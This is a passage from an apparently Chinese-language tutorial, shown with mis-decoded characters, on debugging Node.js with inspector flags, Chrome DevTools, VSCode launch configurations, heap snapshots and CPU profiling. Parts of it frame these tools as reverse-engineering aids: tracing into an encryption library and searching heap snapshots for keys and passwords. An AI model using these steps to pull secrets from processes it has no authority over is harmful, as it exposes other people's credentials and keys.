      <p><strong>æœ€é€šç”¨çš„ Node.js è°ƒè¯•æ–¹æ³•</strong>ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># --inspect: å¯åŠ¨è°ƒè¯•ï¼Œä½†ä¸æš‚åœ</span>
node<span class="w"> </span>--inspect<span class="w"> </span>script.js

<span class="c1"># --inspect-brk: å¯åŠ¨è°ƒè¯•å¹¶åœ¨ç¬¬ä¸€è¡Œæš‚åœï¼ˆæ¨èï¼‰</span>
node<span class="w"> </span>--inspect-brk<span class="w"> </span>script.js

<span class="c1"># æŒ‡å®šè°ƒè¯•ç«¯å£ï¼ˆé»˜è®¤ 9229ï¼‰</span>
node<span class="w"> </span>--inspect-brk<span class="o">=</span><span class="m">5858</span><span class="w"> </span>script.js

<span class="c1"># ç»‘å®šåˆ°æ‰€æœ‰ç½‘ç»œæ¥å£ï¼ˆå…è®¸è¿œç¨‹è°ƒè¯•ï¼‰</span>
node<span class="w"> </span>--inspect-brk<span class="o">=</span><span class="m">0</span>.0.0.0:9229<span class="w"> </span>script.js
</code></pre>
      </div>

      <h3 id="12-è¿æ¥-chrome-devtools">1.2 è¿æ¥ Chrome DevTools</h3>

      <p><strong>æ–¹æ³• 1: chrome://inspect</strong></p>

      <ol>
        <li>å¯åŠ¨è°ƒè¯•æ¨¡å¼åï¼Œç»ˆç«¯æ˜¾ç¤ºï¼š<br />
          <pre><code>Debugger listening on ws://127.0.0.1:9229/unique-id<br />
</code></pre>
        </li>
        <li>æ‰“å¼€ Chrome æµè§ˆå™¨ï¼Œè®¿é—® <code>chrome://inspect</code></li>
        <li>åœ¨ &#8220;Remote Target&#8221; ä¸‹ç‚¹å‡» &#8220;inspect&#8221; æŒ‰é’®</li>
        <li>è‡ªåŠ¨æ‰“å¼€ DevToolsï¼Œå¯ä»¥åƒè°ƒè¯•ç½‘é¡µä¸€æ ·è°ƒè¯• Node.js</li>
      </ol>

      <p><strong>æ–¹æ³• 2: DevTools URL</strong></p>

      <pre><code>chrome-devtools://devtools/bundled/js_app.html?ws=127.0.0.1:9229/unique-id
</code></pre>

      <p><strong>æ–¹æ³• 3: è‡ªåŠ¨å‘ç°</strong></p>

      <ul>
        <li>Settings â†’ Discover network targets</li>
        <li>æ·»åŠ  <code>localhost:9229</code></li>
      </ul>

      <h3 id="13-è°ƒè¯•ç¤ºä¾‹">1.3 è°ƒè¯•ç¤ºä¾‹</h3>

      <p><strong>è„šæœ¬</strong>: encrypt.js</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">crypto</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;crypto&#39;</span><span class="p">);</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">encrypt</span><span class="p">(</span><span class="nx">text</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">cipher</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">crypto</span><span class="p">.</span><span class="nx">createCipheriv</span><span class="p">(</span><span class="s1">&#39;aes-128-cbc&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">,</span><span class="w"> </span><span class="nx">Buffer</span><span class="p">.</span><span class="nx">alloc</span><span class="p">(</span><span class="mf">16</span><span class="p">));</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">encrypted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">cipher</span><span class="p">.</span><span class="nx">update</span><span class="p">(</span><span class="nx">text</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;utf8&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;hex&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">encrypted</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nx">cipher</span><span class="p">.</span><span class="kr">final</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">encrypted</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Buffer</span><span class="p">.</span><span class="kr">from</span><span class="p">(</span><span class="s1">&#39;1234567890abcdef&#39;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">encrypt</span><span class="p">(</span><span class="s1">&#39;Hello World&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;åŠ å¯†ç»“æœ:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">result</span><span class="p">);</span>
</code></pre>
      </div>

      <p><strong>è°ƒè¯•</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code>node<span class="w"> </span>--inspect-brk<span class="w"> </span>encrypt.js
</code></pre>
      </div>

      <p>åœ¨ DevTools ä¸­ï¼š</p>

      <ol>
        <li>è‡ªåŠ¨åœåœ¨ç¬¬ä¸€è¡Œ</li>
        <li>åœ¨ <code>encrypt</code> å‡½æ•°æ‰“æ–­ç‚¹</li>
        <li>F8 ç»§ç»­æ‰§è¡Œ â†’ æ–­åœ¨ <code>encrypt</code> å‡½æ•°</li>
        <li>æŸ¥çœ‹ Scope é¢æ¿ä¸­çš„ <code>text</code>, <code>key</code> å˜é‡</li>
      </ol>

      <hr />

      <h2 id="2-åœ¨-vscode-ä¸­è°ƒè¯•">2. åœ¨ VSCode ä¸­è°ƒè¯•</h2>

      <h3 id="21-javascript-debug-terminal">2.1 JavaScript Debug Terminal</h3>

      <p><strong>æœ€ç®€å•çš„æ–¹æ³•</strong>ï¼ˆæ— éœ€é…ç½®ï¼‰ï¼š</p>

      <ol>
        <li>æ‰“å¼€ VSCode</li>
        <li>ç‚¹å‡»ä¾§è¾¹æ  &#8220;Run and Debug&#8221; (Ctrl+Shift+D)</li>
        <li>ç‚¹å‡» &#8220;JavaScript Debug Terminal&#8221;</li>
        <li>
          <p>åœ¨ç»ˆç«¯ä¸­è¿è¡Œï¼š</p>

          <div class="codehilite">
            <pre><span></span><code>node<span class="w"> </span>script.js
</code></pre>
          </div>
        </li>
        <li>
          <p>VSCode è‡ªåŠ¨ Attach å¹¶åœåœ¨ä½ æ‰“çš„æ–­ç‚¹ä¸Š</p>
        </li>
      </ol>

      <h3 id="22-launchjson-é…ç½®">2.2 launch.json é…ç½®</h3>

      <p><strong>æ›´çµæ´»çš„é…ç½®æ–¹å¼</strong>ï¼š</p>

      <p>åˆ›å»º <code>.vscode/launch.json</code>ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;version&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0.2.0&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;configurations&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">        </span><span class="p">{</span>
<span class="w">            </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;node&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;request&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;launch&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;è°ƒè¯•å½“å‰æ–‡ä»¶&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;skipFiles&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;&lt;node_internals&gt;/**&quot;</span><span class="p">],</span>
<span class="w">            </span><span class="nt">&quot;program&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;${file}&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;console&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;integratedTerminal&quot;</span>
<span class="w">        </span><span class="p">},</span>
<span class="w">        </span><span class="p">{</span>
<span class="w">            </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;node&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;request&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;launch&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;è°ƒè¯• NPM Script&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;runtimeExecutable&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;npm&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;runtimeArgs&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;run&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;start&quot;</span><span class="p">],</span>
<span class="w">            </span><span class="nt">&quot;console&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;integratedTerminal&quot;</span>
<span class="w">        </span><span class="p">},</span>
<span class="w">        </span><span class="p">{</span>
<span class="w">            </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;node&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;request&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;attach&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;é™„åŠ åˆ°è¿›ç¨‹&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;port&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">9229</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;restart&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">]</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>ä½¿ç”¨æ–¹æ³•</strong>:</p>

      <ol>
        <li>F5 å¯åŠ¨è°ƒè¯•</li>
        <li>åœ¨ä»£ç ä¸­ç‚¹å‡»è¡Œå·å·¦ä¾§æ‰“æ–­ç‚¹</li>
        <li>å•æ­¥è°ƒè¯• (F10/F11)</li>
      </ol>

      <h3 id="23-è°ƒè¯•-webpack-æ‰“åŒ…è¿‡ç¨‹">2.3 è°ƒè¯• Webpack æ‰“åŒ…è¿‡ç¨‹</h3>

      <p><strong>åœºæ™¯</strong>: ç†è§£ Webpack å¦‚ä½•å¤„ç†æ¨¡å—</p>

      <p><strong>webpack.config.js</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">module</span><span class="p">.</span><span class="nx">exports</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">entry</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;./src/index.js&#39;</span><span class="p">,</span>
<span class="w">    </span><span class="nx">output</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">filename</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;bundle.js&#39;</span><span class="p">,</span>
<span class="w">        </span><span class="nx">path</span><span class="o">:</span><span class="w"> </span><span class="nx">__dirname</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;/dist&#39;</span>
<span class="w">    </span><span class="p">},</span>
<span class="w">    </span><span class="nx">module</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">rules</span><span class="o">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">            </span><span class="p">{</span>
<span class="w">                </span><span class="nx">test</span><span class="o">:</span><span class="w"> </span><span class="sr">/\.js$/</span><span class="p">,</span>
<span class="w">                </span><span class="nx">use</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;./my-custom-loader.js&#39;</span><span class="w">  </span><span class="c1">// è‡ªå®šä¹‰ Loader</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">]</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">};</span>
</code></pre>
      </div>

      <p><strong>è°ƒè¯• Loader</strong>:</p>

      <p><code>.vscode/launch.json</code>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;node&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;request&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;launch&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;è°ƒè¯• Webpack&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;program&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;${workspaceFolder}/node_modules/webpack/bin/webpack.js&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;args&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;--mode&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;development&quot;</span><span class="p">],</span>
<span class="w">    </span><span class="nt">&quot;console&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;integratedTerminal&quot;</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p>åœ¨ <code>my-custom-loader.js</code> ä¸­æ‰“æ–­ç‚¹ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">module</span><span class="p">.</span><span class="nx">exports</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">source</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">debugger</span><span class="p">;</span><span class="w">  </span><span class="c1">// è‡ªåŠ¨æ–­åœ¨è¿™é‡Œ</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;æ­£åœ¨å¤„ç†:&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">resourcePath</span><span class="p">);</span>
<span class="w">    </span><span class="c1">// ä½ çš„ Loader é€»è¾‘</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">source</span><span class="p">;</span>
<span class="p">};</span>
</code></pre>
      </div>

      <hr />

      <h2 id="3-è°ƒè¯•ç¬¬ä¸‰æ–¹åŒ…">3. è°ƒè¯•ç¬¬ä¸‰æ–¹åŒ…</h2>

      <h3 id="31-è°ƒè¯•-node_modules">3.1 è°ƒè¯• node_modules</h3>

      <p><strong>é—®é¢˜</strong>: ç¬¬ä¸‰æ–¹åŒ…ä»£ç åœ¨ <code>node_modules</code> ä¸­ï¼Œå¦‚ä½•è°ƒè¯•ï¼Ÿ</p>

      <p><strong>æ–¹æ³• 1: ç¦ç”¨ skipFiles</strong></p>

      <p><code>.vscode/launch.json</code>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;skipFiles&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">        </span><span class="c1">// &quot;&lt;node_internals&gt;/**&quot;,  // æ³¨é‡Šæ‰è¿™è¡Œ</span>
<span class="w">        </span><span class="c1">// &quot;node_modules/**&quot;       // æ³¨é‡Šæ‰è¿™è¡Œ</span>
<span class="w">    </span><span class="p">]</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>æ–¹æ³• 2: åªè·³è¿‡ç‰¹å®šåŒ…</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;skipFiles&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">        </span><span class="s2">&quot;&lt;node_internals&gt;/**&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="s2">&quot;node_modules/express/**&quot;</span><span class="p">,</span><span class="w">  </span><span class="c1">// è·³è¿‡ express</span>
<span class="w">        </span><span class="s2">&quot;node_modules/lodash/**&quot;</span><span class="w">    </span><span class="c1">// è·³è¿‡ lodash</span>
<span class="w">    </span><span class="p">]</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>æ–¹æ³• 3: ä½¿ç”¨ npm link</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># è¿›å…¥ç¬¬ä¸‰æ–¹åŒ…ç›®å½•</span>
<span class="nb">cd</span><span class="w"> </span>~/projects/suspicious-package

<span class="c1"># åˆ›å»ºå…¨å±€é“¾æ¥</span>
npm<span class="w"> </span>link

<span class="c1"># å›åˆ°é¡¹ç›®ç›®å½•</span>
<span class="nb">cd</span><span class="w"> </span>~/my-project

<span class="c1"># é“¾æ¥åˆ°æœ¬åœ°åŒ…ï¼ˆæ›¿ä»£ node_modules ä¸­çš„ç‰ˆæœ¬ï¼‰</span>
npm<span class="w"> </span>link<span class="w"> </span>suspicious-package
</code></pre>
      </div>

      <p>ç°åœ¨å¯ä»¥ç›´æ¥åœ¨ <code>~/projects/suspicious-package</code> ä¸­æ‰“æ–­ç‚¹è°ƒè¯•ã€‚</p>

      <h3 id="32-è°ƒè¯•åŠ å¯†åº“">3.2 è°ƒè¯•åŠ å¯†åº“</h3>

      <p><strong>æ¡ˆä¾‹</strong>: é€†å‘æŸåŠ å¯†ç®—æ³•</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åœ¨ä½ çš„ä»£ç ä¸­</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">crypto</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;crypto-js&#39;</span><span class="p">);</span><span class="w">  </span><span class="c1">// ç¬¬ä¸‰æ–¹åŠ å¯†åº“</span>

<span class="c1">// 1. æ‰¾åˆ°åº“çš„æºç ä½ç½®</span>
<span class="c1">// node_modules/crypto-js/core.js</span>

<span class="c1">// 2. åœ¨ VSCode ä¸­æ‰“å¼€è¯¥æ–‡ä»¶ï¼Œæ‰“æ–­ç‚¹</span>

<span class="c1">// 3. è¿è¡Œè°ƒè¯•</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">encrypted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">crypto</span><span class="p">.</span><span class="nx">AES</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">(</span><span class="s2">&quot;data&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;key&quot;</span><span class="p">);</span>
<span class="c1">// â†’ è‡ªåŠ¨æ–­åœ¨ crypto-js å†…éƒ¨</span>
</code></pre>
      </div>

      <hr />

      <h2 id="4-å†…å­˜ä¸æ€§èƒ½åˆ†æ">4. å†…å­˜ä¸æ€§èƒ½åˆ†æ</h2>

      <h3 id="41-heap-snapshot-å †å¿«ç…§">4.1 Heap Snapshot (å †å¿«ç…§)</h3>

      <p><strong>åœºæ™¯</strong>: æŸ¥æ‰¾å†…å­˜æ³„æ¼æˆ–æå–åŠ å¯†å¯†é’¥</p>

      <p><strong>æ–¹æ³• 1: é€šè¿‡ Chrome DevTools</strong></p>

      <ol>
        <li>è¿æ¥åˆ° Node.js è¿›ç¨‹</li>
        <li>Memory é¢æ¿ â†’ &#8220;Take snapshot&#8221;</li>
        <li>æœç´¢å…³é”®å­—ï¼ˆå¦‚ <code>secret</code>, <code>key</code>, <code>password</code>ï¼‰</li>
        <li>æŸ¥çœ‹å­—ç¬¦ä¸²å¯¹è±¡çš„å€¼</li>
      </ol>

      <p><strong>æ–¹æ³• 2: é€šè¿‡ä»£ç ç”Ÿæˆ</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">v8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;v8&#39;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">fs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">);</span>

<span class="c1">// ç”Ÿæˆå †å¿«ç…§</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">snapshot</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">v8</span><span class="p">.</span><span class="nx">writeHeapSnapshot</span><span class="p">();</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;å¿«ç…§å·²ä¿å­˜åˆ°:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">snapshot</span><span class="p">);</span>

<span class="c1">// ä½¿ç”¨ Chrome DevTools åŠ è½½ .heapsnapshot æ–‡ä»¶</span>
</code></pre>
      </div>

      <p><strong>æå–å¯†é’¥ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// 1. ç”Ÿæˆå¿«ç…§</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">snapshot</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">v8</span><span class="p">.</span><span class="nx">writeHeapSnapshot</span><span class="p">();</span>

<span class="c1">// 2. åœ¨ Chrome DevTools ä¸­åŠ è½½</span>
<span class="c1">// 3. æœç´¢ &quot;1234567890abcdef&quot; (æ€€ç–‘çš„å¯†é’¥)</span>
<span class="c1">// 4. æ‰¾åˆ°å¯¹è±¡ï¼ŒæŸ¥çœ‹å¼•ç”¨é“¾ï¼Œå®šä½åˆ°ä»£ç ä½ç½®</span>
</code></pre>
      </div>

      <h3 id="42-cpu-profiling-cpu-æ€§èƒ½åˆ†æ">4.2 CPU Profiling (CPU æ€§èƒ½åˆ†æ)</h3>

      <p><strong>åœºæ™¯</strong>: æ‰¾å‡ºè€—æ—¶çš„åŠ å¯†/æ··æ·†å‡½æ•°</p>

      <p><strong>æ–¹æ³• 1: é€šè¿‡ Chrome DevTools</strong></p>

      <ol>
        <li>Profiler é¢æ¿ â†’ Start</li>
        <li>æ‰§è¡Œç›®æ ‡æ“ä½œ</li>
        <li>Stop â†’ æŸ¥çœ‹ Flame Chart</li>
      </ol>

      <p><strong>æ–¹æ³• 2: é€šè¿‡ä»£ç </strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">inspector</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;inspector&#39;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">fs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">);</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">session</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">inspector</span><span class="p">.</span><span class="nx">Session</span><span class="p">();</span>
<span class="nx">session</span><span class="p">.</span><span class="nx">connect</span><span class="p">();</span>

<span class="c1">// å¼€å§‹æ€§èƒ½åˆ†æ</span>
<span class="nx">session</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;Profiler.enable&#39;</span><span class="p">);</span>
<span class="nx">session</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;Profiler.start&#39;</span><span class="p">);</span>

<span class="c1">// æ‰§è¡Œç›®æ ‡ä»£ç </span>
<span class="nx">expensiveEncryptFunction</span><span class="p">();</span>

<span class="c1">// åœæ­¢å¹¶ä¿å­˜</span>
<span class="nx">session</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;Profiler.stop&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">profile</span><span class="w"> </span><span class="p">})</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">fs</span><span class="p">.</span><span class="nx">writeFileSync</span><span class="p">(</span><span class="s1">&#39;profile.cpuprofile&#39;</span><span class="p">,</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">profile</span><span class="p">));</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;æ€§èƒ½åˆ†æå·²ä¿å­˜&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">session</span><span class="p">.</span><span class="nx">disconnect</span><span class="p">();</span>
<span class="p">});</span>
</code></pre>
      </div>

      <p><strong>åˆ†æç»“æœ</strong>:</p>

      <ul>
        <li>åœ¨ Chrome DevTools â†’ Profiler â†’ Load profile</li>
        <li>æŸ¥çœ‹ &#8220;Self Time&#8221; æœ€é•¿çš„å‡½æ•° â†’ è¿™å°±æ˜¯æ€§èƒ½ç“¶é¢ˆ</li>
        <li>é€šå¸¸æ˜¯åŠ å¯†/æ··æ·†çš„æ ¸å¿ƒé€»è¾‘</li>
      </ul>

      <h3 id="43-timeline-æ—¶é—´çº¿åˆ†æ">4.3 Timeline (æ—¶é—´çº¿åˆ†æ)</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">performance</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;perf_hooks&#39;</span><span class="p">);</span>

<span class="c1">// æ ‡è®°å¼€å§‹</span>
<span class="nx">performance</span><span class="p">.</span><span class="nx">mark</span><span class="p">(</span><span class="s1">&#39;encrypt-start&#39;</span><span class="p">);</span>

<span class="nx">encrypt</span><span class="p">(</span><span class="nx">largeData</span><span class="p">);</span>

<span class="c1">// æ ‡è®°ç»“æŸ</span>
<span class="nx">performance</span><span class="p">.</span><span class="nx">mark</span><span class="p">(</span><span class="s1">&#39;encrypt-end&#39;</span><span class="p">);</span>

<span class="c1">// æµ‹é‡è€—æ—¶</span>
<span class="nx">performance</span><span class="p">.</span><span class="nx">measure</span><span class="p">(</span><span class="s1">&#39;encrypt&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;encrypt-start&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;encrypt-end&#39;</span><span class="p">);</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">measure</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">performance</span><span class="p">.</span><span class="nx">getEntriesByName</span><span class="p">(</span><span class="s1">&#39;encrypt&#39;</span><span class="p">)[</span><span class="mf">0</span><span class="p">];</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`åŠ å¯†è€—æ—¶: </span><span class="si">${</span><span class="nx">measure</span><span class="p">.</span><span class="nx">duration</span><span class="si">}</span><span class="sb">ms`</span><span class="p">);</span>
</code></pre>
      </div>

      <hr />

      <h2 id="5-è°ƒè¯•å¼‚æ­¥ä»£ç ">5. è°ƒè¯•å¼‚æ­¥ä»£ç </h2>

      <h3 id="51-promise-è°ƒè¯•">5.1 Promise è°ƒè¯•</h3>

      <p><strong>é—®é¢˜</strong>: Promise é“¾ä¸­çš„é”™è¯¯éš¾ä»¥è¿½è¸ª</p>

      <p><strong>è§£å†³æ–¹æ¡ˆ 1: async/await</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// âŒ éš¾ä»¥è°ƒè¯•</span>
<span class="nx">fetch</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span>
<span class="w">    </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">res</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>
<span class="w">    </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">data</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">process</span><span class="p">(</span><span class="nx">data</span><span class="p">))</span>
<span class="w">    </span><span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="nx">err</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">err</span><span class="p">));</span>

<span class="c1">// âœ… æ˜“äºè°ƒè¯•</span>
<span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">fetchData</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span><span class="w">  </span><span class="c1">// æ–­ç‚¹</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">();</span><span class="w">  </span><span class="c1">// æ–­ç‚¹</span>
